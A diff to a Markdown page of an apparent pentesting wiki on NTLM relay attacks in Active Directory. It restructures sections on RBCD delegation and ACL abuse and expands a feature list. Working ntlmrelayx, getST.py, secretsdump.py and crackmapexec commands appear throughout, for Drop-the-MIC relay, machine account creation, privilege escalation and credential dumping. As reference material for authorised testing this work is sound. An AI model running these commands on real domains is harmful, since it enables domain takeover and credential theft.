@@ -46,8 +46,12 @@ proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
 ```
 {% endtab %}
 
-{% tab title="Domain account creation" %}
-The following command will try to relay the authentication over LDAPS, attempt to exploit CVE-2019-1040 \(a.k.a. Drop the MIC\) to "unsign" the NTLM messages \(`--remove-mic`\), abuse the default value \(10\) of `ms-DS-MachineAccountQuota` to create a domain machine account \(`--add-machine`\) and finally, [abuse Resource Based Kerberos Constrained Delegations \(RBCD\)](../abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd) to gain admin access to the relayed machine \(`--delegate-access`\).
+{% tab title="Kerberos delegation" %}
+The following command will 
+
+* try to relay the authentication over LDAPS, attempt to exploit CVE-2019-1040 \(a.k.a. Drop the MIC\) to "unsign" the NTLM messages \(`--remove-mic`\)
+* abuse the default value \(10\) of `ms-DS-MachineAccountQuota` to create a domain machine account \(`--add-machine`\)
+* and finally, [abuse Resource Based Kerberos Constrained Delegations \(RBCD\)](../abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd) to gain admin access to the relayed machine \(`--delegate-access`\).
 
 ```bash
 ntlmrelayx.py -t ldaps://$DC_TARGET -smb2support --remove-mic --add-computer SHUTDOWN --delegate-access
@@ -60,14 +64,22 @@ getST.py -spn host/$RELAYED_VICTIM '$DOMAIN/$NEW_MACHINE_ACCOUNT$:$PASSWORD' -dc
 export KRB5CCNAME=$USER_TO_IMPERSONATE.ccache
 secretsdump.py -k $RELAYED_VICTIM
 ```
+
+{% hint style="info" %}
+The `--add-computer` is optional. The computer account to give delegation rights to can be defined with the `--escalate-user` option.
+
+```bash
+ntlmrelayx.py -t ldap://$DC_TARGET -smb2support --remove-mic --escalate-user $ControlledComputerAccount --delegate-access
+```
+{% endhint %}
 {% endtab %}
 
-{% tab title="Domain account promotion" %}
+{% tab title="ACL abuse" %}
 {% hint style="info" %}
-This technique is usually combined with a [PushSubscription abuse \(a.k.a. PrivExchange\)](../forced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains \(`WriteDACL` over domain object, see [Abusing ACLs](../abusing-aces/)\) to escalate a domain user privileges \(`--escalate-user`\).
+This technique is usually combined with a [PushSubscription abuse \(a.k.a. PrivExchange\)](../forced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to force an Exchange server to initiate an authentication, relay it to a domain controller and abuse the default high privileges of Exchange servers in AD domains \(`WriteDACL` over domain object, see [Abusing ACEs](../abusing-aces/)\) to escalate a domain user privileges \(`--escalate-user`\).
 {% endhint %}
 
-The following command will try to relay the authentication over LDAPS and escalate the privileges of a domain user by adding it to a privileged group \(`--escalate-user`\).
+The following command will try to relay the authentication over LDAPS and escalate the privileges of a domain user by adding it to a privileged group \(`--escalate-user`\) if the relayed account has sufficient privileges.
 
 ```bash
 ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
@@ -75,22 +87,20 @@ ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
 {% endtab %}
 {% endtabs %}
 
-### Tools features
+The ntlmrelayx tool offers many features making it a very valuable asset when pentesting an Active Directory domain:
 
-{% tabs %}
-{% tab title="ntlmrelayx" %}
-This tool offers many features making it a very valuable asset when pentesting an Active Directory domain:
-
-* It can be combined with mitm6 \(for [IPv6 + name poisoning](../forced-authentications/#ipv6-dns-poisoning)\) be enabling IPv6 support with the `-6` option.
+* It can be combined with mitm6 \(for [DHCPv6 + name poisoning](../forced-authentications/#ipv6-dns-poisoning)\) by enabling IPv6 support with the `-6` option.
 * It has the ability to open SOCKS proxies for every new session after a successful relayed authentication. This allows testers to exploit those sessions later on with tools like [proxychains](https://github.com/haad/proxychains). This feature can be enabled with the `-socks` option.
 * It supports SMB2. It can be enabled with the `-smb2support` option.
-* It has the ability to relay a single connection \(SMB only for now\) to multiple targets.
-* It implements CVE-2019-1040 with the `--remove-mic` option, usually needed when attempting "unsigning cross-protocols NTLM relay attacks" \(SMB to LDAP/S\).
+* It implements **CVE-2019-1040** with the `--remove-mic` option, usually needed when attempting "**unsigning cross-protocols NTLM relay attacks**" \(e.g. **SMB to LDAP/S\)**.
 * It has the ability to attack multiple targets with the `-tf` option instead of `-t`.
+* It has the ability to dump domain info and escalate user privileges when possible \(via [ACEs abuses](../abusing-aces/)\) with the `--escalate-user` option.
+* It has the ability to operate an [RBCD Kerberos delegation](../abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd) attack with the `--delegate-access` option.
 * It has the ability to relay connections for specific target users.
+* It has the ability to relay a single connection \(SMB only for now\) to multiple targets.
 
 {% hint style="info" %}
-In theory, thanks to [the recent "multi-relay" feature](https://www.secureauth.com/blog/what-old-new-again-relay-attack), another attacker can be added to the targets to combine ntlmrelayx with Responder servers and capture a NTLM hash with a custom challenge while relaying
+In theory, thanks to [the recent "multi-relay" feature](https://www.secureauth.com/blog/what-old-new-again-relay-attack), another attacker machine/interface can be added to the targets to combine ntlmrelayx with Responder servers. The attackers will be able capture a NTLM hash with a custom challenge on an interface/machine, while relaying on another.
 {% endhint %}
 
 The targets file used with the `-tf` option can contain the following
@@ -110,12 +120,10 @@ someserver.domain.lan
 ```bash
 crackmapexec smb --gen-relay-list targets.txt $SUBNET
 ```
-{% endtab %}
 
-{% tab title="Inveigh-Relay" %}
+### 🛠️ Drop The MIC \(CVE-2019-1040\)
 
-{% endtab %}
-{% endtabs %}
+//TODO
 
 ## References
 
